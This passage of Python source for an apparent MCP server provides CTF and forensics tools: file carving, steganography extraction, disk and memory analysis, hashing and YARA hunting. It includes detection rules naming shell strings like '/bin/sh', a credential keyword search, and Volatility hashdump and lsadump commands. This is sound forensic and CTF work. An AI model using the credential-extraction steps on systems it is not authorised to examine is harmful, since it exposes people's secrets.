        (b"GIF89a", b"\x00\x3b", "GIF89a"),
        (b"%PDF-", b"%%EOF", "PDF"),
        (b"PK\x03\x04", None, "ZIP/DOCX/XLSX"),
        (b"\x1f\x8b", None, "GZIP"),
        (b"BZh", None, "BZIP2"),
        (b"\x7fELF", None, "ELF"),
        (b"MZ", None, "PE/EXE"),
        (b"RIFF", None, "RIFF (WAV/AVI)"),
        (b"ftyp", None, "MP4/MOV"),
        (b"ID3", None, "MP3"),
        (b"SQLite format 3", None, "SQLite"),
        (b"\xd4\xc3\xb2\xa1", None, "PCAP"),
        (b"\x0a\x0d\x0d\x0a", None, "PCAPNG"),
        (b"-----BEGIN", b"-----END", "PEM"),
        (b"OggS", None, "OGG"),
        (b"7z\xbc\xaf'\x1c", None, "7-Zip"),
        (b"Rar!\x1a\x07", None, "RAR"),
        (b"\xd0\xcf\x11\xe0", None, "MS Office (OLE2)"),
        (b"dex\n", None, "Android DEX"),
    ]

    found: list[dict] = []
    for header, footer, ftype in SIGNATURES:
        pos = 0
        while True:
            pos = data.find(header, pos)
            if pos == -1:
                break
            if footer:
                end = data.find(footer, pos + len(header))
                size = (end - pos + len(footer)) if end != -1 else -1
            else:
                size = -1  # unknown without footer
            found.append({"offset": pos, "type": ftype,
                          "header": header.hex(), "size": size})
            pos += 1

    found.sort(key=lambda x: x["offset"])

    lines = [f"=== File Carving: {path} ===",
             f"File size: {len(data):,} bytes",
             f"Signatures found: {len(found)}", ""]

    if found:
        lines.append(f"{'OFFSET':<12} {'HEX OFF':<10} {'TYPE':<22} {'SIZE'}")
        lines.append("-" * 60)
        for f in found[:60]:
            size_str = f"{f['size']:,}" if f['size'] > 0 else "unknown"
            lines.append(f"{f['offset']:<12,} 0x{f['offset']:08x}  {f['type']:<22} {size_str}")
        if len(found) > 60:
            lines.append(f"... and {len(found)-60} more")
        lines.append("")
        lines.append("→ Use forens_extract_chunk to extract a specific offset/length.")
        lines.append("→ Or use forens_binwalk_scan(extract=True) for automatic extraction.")
    else:
        lines.append("No known file signatures found.")

    return "\n".join(lines)


@mcp.tool()
def forens_extract_chunk(path: str, offset: int, length: int, out_name: str = "") -> str:
    """Extract a raw byte chunk from a file and save to /tmp/ctf/.

    Useful for pulling carved files out of a binary blob.

    Args:
        path: Source file (relative to workspace).
        offset: Start byte offset.
        length: Number of bytes to extract.
        out_name: Output filename (default: <source>_0x<offset>.bin).

    Returns:
        Saved path, size, hex preview, and file type of the extracted chunk.
    """
    safe = _safe_path(path)
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    chunk = data[offset:offset + length]
    if not chunk:
        return f"No data at offset {offset} (file is {len(data)} bytes)."

    SCRATCH.mkdir(parents=True, exist_ok=True)
    if not out_name:
        out_name = f"{safe.stem}_0x{offset:08x}.bin"
    out_path = SCRATCH / out_name
    out_path.write_bytes(chunk)

    file_type = _run(["file", "-b", str(out_path)], timeout=5)
    hex_preview = " ".join(f"{b:02x}" for b in chunk[:32])

    return (f"=== Extracted Chunk ===\n"
            f"Source : {path}\n"
            f"Offset : {offset} (0x{offset:08x})\n"
            f"Length : {len(chunk):,} bytes\n"
            f"Saved  : {out_path}\n"
            f"Type   : {file_type.strip()}\n"
            f"Preview: {hex_preview}")


@mcp.tool()
def forens_image_lsb(path: str, channel: str = "all", bit_planes: str = "0") -> str:
    """Extract LSB (Least Significant Bit) data from an image file.

    Args:
        path: Path to image file (relative to workspace).
        channel: Color channel to inspect — "R", "G", "B", "A", or "all".
        bit_planes: Comma-separated bit planes to extract, e.g. "0", "0,1", "0,1,2".

    Returns:
        Raw LSB bits, decoded ASCII attempt, and hex dump of extracted bytes.
    """
    safe = _safe_path(path)
    try:
        from PIL import Image  # type: ignore
    except ImportError:
        # Fall back to zsteg
        out = _run(["zsteg", str(safe)], timeout=30)
        return (f"Pillow not installed — falling back to zsteg:\n\n"
                f"=== zsteg LSB: {path} ===\n{out.strip()}")

    try:
        img = Image.open(str(safe)).convert("RGBA")
    except Exception as exc:
        return f"Cannot open image: {exc}"

    pixels = list(img.getdata())
    ch_map = {"R": 0, "G": 1, "B": 2, "A": 3}
    planes = [int(p.strip()) for p in bit_planes.split(",") if p.strip().isdigit()]

    channels = (list(ch_map.keys()) if channel.upper() == "ALL"
                else [channel.upper()])

    bits = []
    for ch in channels:
        idx = ch_map.get(ch, 0)
        for px in pixels:
            pv = px[idx]
            for plane in planes:
                bits.append((pv >> plane) & 1)

    # Convert bits to bytes
    byte_vals = []
    for i in range(0, len(bits) - 7, 8):
        byte_vals.append(int("".join(str(b) for b in bits[i:i+8]), 2))

    raw_bytes = bytes(byte_vals)
    printable = "".join(chr(b) if 32 <= b < 127 else "." for b in raw_bytes[:200])
    hex_dump = " ".join(f"{b:02x}" for b in raw_bytes[:64])

    lines = [f"=== LSB Extraction: {path} ===",
             f"Image size : {img.width}x{img.height}",
             f"Channels   : {', '.join(channels)}",
             f"Bit planes : {bit_planes}",
             f"Bits       : {len(bits)}  →  {len(byte_vals)} bytes",
             "",
             "--- ASCII Preview (first 200 chars) ---",
             printable,
             "",
             "--- Hex Dump (first 64 bytes) ---",
             hex_dump,
             ""]

    # Flag hunt in extracted bytes
    flag_hits = re.findall(r"[a-zA-Z0-9_]{2,10}\{[^}]{3,60}\}", printable)
    if flag_hits:
        lines.append("--- FLAGS FOUND ---")
        for f in flag_hits:
            lines.append(f"  ★ {f}")

    return "\n".join(lines)


@mcp.tool()
def forens_audio_spectrogram(path: str) -> str:
    """Analyze an audio file for steganographic content and spectral anomalies.

    Checks for hidden text in spectrograms, DTMF tones, and unusual LSB patterns.

    Args:
        path: Path to audio file — WAV, MP3, or OGG (relative to workspace).

    Returns:
        Audio metadata, DTMF decode attempt, spectrum stats, and tool suggestions.
    """
    safe = _safe_path(path)

    # ExifTool metadata
    meta = _run(["exiftool", "-Duration", "-SampleRate", "-Channels",
                 "-BitsPerSample", "-AudioBitrate", "-FileType", str(safe)], timeout=10)

    # Try to get duration and format via file command
    file_out = _run(["file", "-b", str(safe)], timeout=5)

    # sox stats if available
    sox_stats = _run(["sox", str(safe), "-n", "stat"], timeout=15)
    sox_spec = _run(["sox", str(safe), "-n", "spectrogram", "-o",
                     str(SCRATCH / (safe.name + "_spec.png"))], timeout=30)

    lines = [f"=== Audio Forensics: {path} ===",
             "",
             "--- File Info ---",
             file_out.strip(),
             "",
             "--- ExifTool Metadata ---",
             meta.strip() or "(no metadata extracted)",
             ""]

    if sox_stats.strip():
        lines.append("--- Sox Stats ---")
        lines.append(sox_stats.strip())
        lines.append("")

    spec_file = SCRATCH / (safe.name + "_spec.png")
    if spec_file.exists():
        lines.append(f"--- Spectrogram saved to: {spec_file} ---")
        lines.append("  Use forens_hex_view or image tools to inspect it.")
        lines.append("")

    lines.append("=== CTF Audio Techniques ===")
    lines.append("""
--- Spectrogram steganography ---
  View the spectrogram in Sonic Visualiser or Audacity (Analyze → Plot Spectrum)
  Hidden text/images often appear at high frequencies or in short silent segments.
  Tools: Audacity (View → Spectrogram), Sonic Visualiser, sox spectrogram

--- DTMF decoding (phone tones) ---
  multimon-ng -t wav -a DTMF recording.wav
  sox recording.wav -t raw - | multimon-ng -t raw -a DTMF -

--- LSB audio steganography ---
  WavSteg: python WavSteg.py -r -i input.wav -o output.txt
  mp3stego: Decode.exe -X -P passphrase input.mp3
  OpenStego: GUI tool for LSB in audio/images

--- Morse code ---
  Listen/visualize manually, or:
  python -c "import morse_talk; print(morse_talk.decode(...))"

--- Speed/pitch manipulation ---
  sox input.wav output.wav speed 2.0   # double speed
  sox input.wav output.wav reverse     # play backwards

--- Hidden data after EOF ---
  Append steghide data after audio end marker.
  Check: hexdump -C file.wav | tail -20
""")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_disk_image_info(path: str) -> str:
    """Analyze a disk image file — partition table, filesystem types, file listing.

    Args:
        path: Path to disk image (.img, .dd, .raw, .iso, .vmdk) relative to workspace.

    Returns:
        Partition table, filesystem signatures, and top-level file listing per partition.
    """
    safe = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)

    lines = [f"=== Disk Image: {path} ===\n"]

    # file type
    file_out = _run(["file", "-b", str(safe)], timeout=5)
    lines.append(f"Type: {file_out.strip()}\n")

    # fdisk partition table
    fdisk_out = _run(["fdisk", "-l", str(safe)], timeout=15)
    lines.append("--- Partition Table (fdisk) ---")
    lines.append(fdisk_out.strip() or "(fdisk could not parse)")
    lines.append("")

    # mmls (The Sleuth Kit) — more robust
    mmls_out = _run(["mmls", str(safe)], timeout=15)
    if mmls_out.strip():
        lines.append("--- Partition Layout (mmls / Sleuth Kit) ---")
        lines.append(mmls_out.strip())
        lines.append("")

    # Try to parse sector offsets from fdisk output and list files
    offsets = re.findall(r"^\S+\s+(\d+)\s+\d+\s+\d+", fdisk_out, re.MULTILINE)
    for sector in offsets[:4]:
        byte_offset = int(sector) * 512
        lines.append(f"--- Files at sector {sector} (offset {byte_offset}) ---")
        ls_out = _run(["fls", "-r", "-o", sector, str(safe)], timeout=15)
        lines.append(ls_out.strip()[:1000] or "(could not list files — fls not available)")
        lines.append("")

    lines.append("=== Manual Extraction Commands ===")
    lines.append(f"""  # Mount partition (Linux):
  sudo mount -o loop,offset=$((SECTOR*512)) {safe} /mnt/evidence

  # Sleuth Kit file listing:
  fls -r -o SECTOR {safe}

  # Extract a file by inode:
  icat -o SECTOR {safe} INODE > output_file

  # Recover deleted files:
  tsk_recover -e {safe} /tmp/recovered/

  # Autopsy (GUI): autopsy &  →  http://localhost:9999/autopsy
""")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_memory_strings(path: str, keywords: str = "password,flag,token,secret,key") -> str:
    """Search a memory dump for interesting strings and keyword patterns.

    Args:
        path: Path to memory dump file (relative to workspace).
        keywords: Comma-separated keywords to search for (default: password,flag,token,secret,key).

    Returns:
        Keyword hit counts, matching lines, URLs, IPs, and credential patterns.
    """
    safe = _safe_path(path)
    kws = [k.strip() for k in keywords.split(",") if k.strip()]

    # Extract all strings
    all_strings_out = _run(["strings", "-n", "8", str(safe)], timeout=60)
    all_strings = all_strings_out.splitlines()

    lines = [f"=== Memory Strings: {path} ===",
             f"Total strings: {len(all_strings)}",
             f"Keywords: {', '.join(kws)}", ""]

    for kw in kws:
        hits = [s for s in all_strings if kw.lower() in s.lower()]
        if hits:
            lines.append(f"--- '{kw}' ({len(hits)} hits) ---")
            for h in hits[:20]:
                lines.append(f"  {h[:120]}")
            if len(hits) > 20:
                lines.append(f"  ... +{len(hits)-20} more")
            lines.append("")

    # URLs
    urls = [s for s in all_strings if re.match(r"https?://", s)]
    if urls:
        lines.append(f"--- URLs ({len(urls)}) ---")
        for u in list(set(urls))[:20]:
            lines.append(f"  {u[:120]}")
        lines.append("")

    # IP addresses
    ips = []
    for s in all_strings:
        found = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", s)
        ips.extend(found)
    ips = list(set(ips))
    if ips:
        lines.append(f"--- IP Addresses ({len(ips)}) ---")
        for ip in ips[:20]:
            lines.append(f"  {ip}")
        lines.append("")

    # Email addresses
    emails = []
    for s in all_strings:
        found = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", s)
        emails.extend(found)
    if emails:
        lines.append(f"--- Emails ({len(set(emails))}) ---")
        for e in list(set(emails))[:15]:
            lines.append(f"  {e}")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_timeline(path: str) -> str:
    """Build a filesystem timeline from a file or directory listing.

    Extracts modification, access, change, and creation timestamps from files
    in the workspace and sorts them chronologically.

    Args:
        path: Path to directory or single file (relative to workspace).

    Returns:
        Chronological event timeline with file paths and timestamp types.
    """
    safe = _safe_path(path)

    # Use find + stat to get timestamps
    if safe.is_dir():
        find_out = _run(["find", str(safe), "-type", "f"], timeout=15)
        file_list = find_out.strip().splitlines()
    else:
        file_list = [str(safe)]

    events: list[tuple[str, str, str]] = []  # (timestamp, type, path)

    for fpath in file_list[:200]:  # cap at 200 files
        stat_out = _run(
            ["stat", "--format=%n|%y|%x|%z|%w", fpath], timeout=5
        )
        for line in stat_out.strip().splitlines():
            parts = line.split("|")
            if len(parts) >= 4:
                name = parts[0]
                mtime = parts[1].split(".")[0]  # modification
                atime = parts[2].split(".")[0]  # access
                ctime = parts[3].split(".")[0]  # change
                if len(parts) >= 5:
                    btime = parts[4].split(".")[0]  # birth (not always available)
                    if btime and btime != "-":
                        events.append((btime, "BORN", name))
                events.append((mtime, "MTIME", name))
                events.append((atime, "ATIME", name))
                events.append((ctime, "CTIME", name))

    events.sort(key=lambda x: x[0])

    lines = [f"=== Timeline: {path} ===",
             f"Files processed: {len(file_list)}",
             f"Events         : {len(events)}", "",
             f"{'TIMESTAMP':<25} {'TYPE':<7} PATH"]
    lines.append("-" * 80)
    for ts, etype, fpath in events[:200]:
        short = fpath.replace(str(WORKSPACE), "")
        lines.append(f"{ts:<25} {etype:<7} {short}")
    if len(events) > 200:
        lines.append(f"... and {len(events)-200} more events")

    return _truncate("\n".join(lines), 8192)


@mcp.tool()
def forens_hash_file(path: str) -> str:
    """Compute multiple cryptographic hashes of a file and check against known malware databases.

    Args:
        path: Path to file (relative to workspace).

    Returns:
        MD5, SHA1, SHA256, SHA512 hashes plus VirusTotal/MalwareBazaar lookup links.
    """
    safe = _safe_path(path)
    try:
        data = safe.read_bytes()
    except FileNotFoundError:
        return f"File not found: {path}"

    md5    = hashlib.md5(data).hexdigest()
    sha1   = hashlib.sha1(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()
    sha512 = hashlib.sha512(data).hexdigest()
    size   = len(data)

    # ssdeep fuzzy hash if available
    ssdeep_out = _run(["ssdeep", str(safe)], timeout=10)
    fuzzy = ""
    if ssdeep_out and "ssdeep" not in ssdeep_out.lower()[:30]:
        for line in ssdeep_out.splitlines():
            if ":" in line and not line.startswith("ssdeep"):
                fuzzy = line.split(",")[0]
                break

    return (
        f"=== File Hashes: {path} ===\n"
        f"Size   : {size:,} bytes ({size/1024:.1f} KB)\n\n"
        f"MD5    : {md5}\n"
        f"SHA1   : {sha1}\n"
        f"SHA256 : {sha256}\n"
        f"SHA512 : {sha512}\n"
        + (f"ssdeep : {fuzzy}\n" if fuzzy else "") +
        f"\n=== Threat Intelligence Lookups ===\n"
        f"  VirusTotal    : https://www.virustotal.com/gui/file/{sha256}\n"
        f"  MalwareBazaar : https://bazaar.abuse.ch/sample/{sha256}/\n"
        f"  Hybrid Anal.  : https://www.hybrid-analysis.com/search?query={sha256}\n"
        f"  Triage        : https://tria.ge/s?q={sha256}\n"
        f"  OTX AlienVault: https://otx.alienvault.com/indicator/file/{sha256}\n"
    )


@mcp.tool()
def forens_yara_hunt(path: str, rules: str = "") -> str:
    """Run YARA rules against a file to detect malware, packers, or CTF artifacts.

    Args:
        path: Path to file (relative to workspace).
        rules: YARA rule(s) as inline text. If empty, uses a built-in CTF ruleset.

    Returns:
        YARA match results with rule names and matched strings.
    """
    safe = _safe_path(path)
    SCRATCH.mkdir(parents=True, exist_ok=True)

    DEFAULT_RULES = r"""
rule CTF_Flag {
    meta: description = "Common CTF flag patterns"
    strings:
        $f1 = /flag\{[^\}]+\}/ nocase
        $f2 = /CTF\{[^\}]+\}/ nocase
        $f3 = /HTB\{[^\}]+\}/ nocase
        $f4 = /THM\{[^\}]+\}/ nocase
        $f5 = /picoCTF\{[^\}]+\}/ nocase
    condition: any of them
}

rule Suspicious_Strings {
    meta: description = "Suspicious strings often found in CTF binaries"
    strings:
        $s1 = "password" nocase
        $s2 = "secret" nocase
        $s3 = "strcmp" nocase
        $s4 = "getenv" nocase
        $s5 = "system" nocase
        $s6 = "/bin/sh" nocase
        $s7 = "popen" nocase
    condition: 3 of them
}

rule Encoded_Data {
    meta: description = "Possible encoded / obfuscated data"
    strings:
        $b64 = /[A-Za-z0-9+\/]{40,}={0,2}/
        $hex = /([0-9a-fA-F]{2}){20,}/
        $xor = { 00 [1-4] (FF | FE | AA | 55 | 0F | F0) }
    condition: any of them
}

rule ELF_Executable {
    strings: $elf = { 7F 45 4C 46 }
    condition: $elf at 0
}

rule PE_Executable {
    strings: $mz = { 4D 5A }
    condition: $mz at 0
}

rule Packed_UPX {
    strings: $upx = "UPX!" ascii
    condition: $upx
}

rule Steganography_Tool_Output {
    strings:
        $s1 = "steghide" nocase
        $s2 = "outguess" nocase
        $s3 = "jsteg" nocase
        $s4 = "LSB" ascii
    condition: any of them
}
"""

    rule_text = rules if rules.strip() else DEFAULT_RULES
    rule_file = SCRATCH / "hunt.yar"
    rule_file.write_text(rule_text)

    out = _run(["yara", "-s", str(rule_file), str(safe)], timeout=30)

    if not out.strip():
        result = f"No YARA rules matched in {path}."
    else:
        result = f"=== YARA Hunt: {path} ===\n\n" + out.strip()

    return _truncate(result, 8192)


@mcp.tool()
def forens_volatility_hints(profile: str = "Win10x64") -> str:
    """Return a Volatility 3 command reference for memory forensics analysis.

    Args:
        profile: OS profile hint — Win10x64, Win7x86, Linux, macOS (default Win10x64).

    Returns:
        Key Volatility 3 commands with descriptions for CTF memory analysis.
    """
    base = "vol.py"

    WIN_PLUGINS = [
        ("windows.pslist", "List running processes"),
        ("windows.pstree", "Process tree (parent/child)"),
        ("windows.cmdline", "Command-line args of each process"),
        ("windows.dlllist", "DLLs loaded per process"),
        ("windows.handles", "Open handles (files, registry, events)"),
        ("windows.malfind", "Find injected/hidden code (RWX memory)"),
        ("windows.netscan", "Active and closed network connections"),
        ("windows.netstat", "Network statistics"),
        ("windows.registry.hivelist", "List registry hives"),
        ("windows.registry.printkey", "Read registry key values"),
        ("windows.hashdump", "Dump NT/LM password hashes (SAM)"),
        ("windows.lsadump", "LSA secrets from registry"),
        ("windows.filescan", "Scan for FILE_OBJECT structures"),
        ("windows.dumpfiles", "Dump a file from memory by offset"),
        ("windows.procdump", "Dump process memory to disk"),
        ("windows.memdump", "Full memory dump of a process"),
        ("windows.strings", "Find strings in process memory"),
        ("windows.vadinfo", "Virtual Address Descriptor info"),
        ("windows.svcscan", "Windows services list"),
        ("windows.driverirp", "Driver IRP hooks (rootkit check)"),
        ("windows.modscan", "Kernel modules scan"),
        ("windows.mutantscan", "Mutex objects (malware C2 markers)"),
        ("windows.envars", "Environment variables per process"),
        ("windows.getsids", "SIDs for each process"),
        ("windows.clipboard", "Clipboard contents"),
        ("windows.screenshot", "Capture screen from memory"),
        ("windows.userassist", "UserAssist registry (recently run)"),
        ("windows.shimcache", "AppCompatCache (execution history)"),
        ("windows.prefetch", "Prefetch artifacts"),
    ]

    LINUX_PLUGINS = [
        ("linux.pslist", "List Linux processes"),
        ("linux.pstree", "Process tree"),
        ("linux.bash", "Bash history from memory"),
        ("linux.netfilter", "Netfilter hooks"),
        ("linux.check_syscall", "Syscall table hooks"),
        ("linux.malfind", "Injected/hidden code"),
        ("linux.proc_maps", "Process memory maps"),
        ("linux.lsof", "Open file descriptors"),
        ("linux.keyboard_notifiers", "Keylogger hooks"),
    ]

    p = profile.lower()
    plugins = LINUX_PLUGINS if "linux" in p else WIN_PLUGINS

    lines = [f"=== Volatility 3 Reference ({profile}) ===\n",
             f"Basic usage: {base} -f memory.dmp <plugin> [options]\n",
             f"{'PLUGIN':<45} DESCRIPTION"]
    lines.append("-" * 80)
    for plugin, desc in plugins:
        lines.append(f"  {plugin:<43} {desc}")

    lines.append(f"""
=== Common Workflow ===
1. Identify OS / profile:
   {base} -f memory.dmp windows.info
   {base} -f memory.dmp banners.Banners  (Linux)

2. Process recon:
   {base} -f memory.dmp windows.pslist
   {base} -f memory.dmp windows.cmdline

3. Network connections:
   {base} -f memory.dmp windows.netscan

4. Find suspicious code:
   {base} -f memory.dmp windows.malfind

5. Dump a process (PID 1234):
   {base} -f memory.dmp windows.procdump --pid 1234

6. Extract a file (offset 0x...):
   {base} -f memory.dmp windows.dumpfiles --virtaddr 0x<addr>

7. Password hashes:
   {base} -f memory.dmp windows.hashdump

=== Useful Options ===
  --pid PID          Filter by process ID
  --name NAME        Filter by process name
  -o /output/dir     Output directory for dumps
  --dump             Dump the artifact to disk

=== Volatility 2 (legacy) ===
  vol2.py -f memory.dmp --profile={profile} <plugin>
  Common plugins: pslist pstree cmdline dlllist netscan malfind
                  hashdump filescan dumpfiles memdump
""")

    return "\n".join(lines)


if __name__ == "__main__":
    # Host/port are read from FASTMCP_HOST / FASTMCP_PORT (set in the Dockerfile).
    mcp.run(transport="streamable-http")
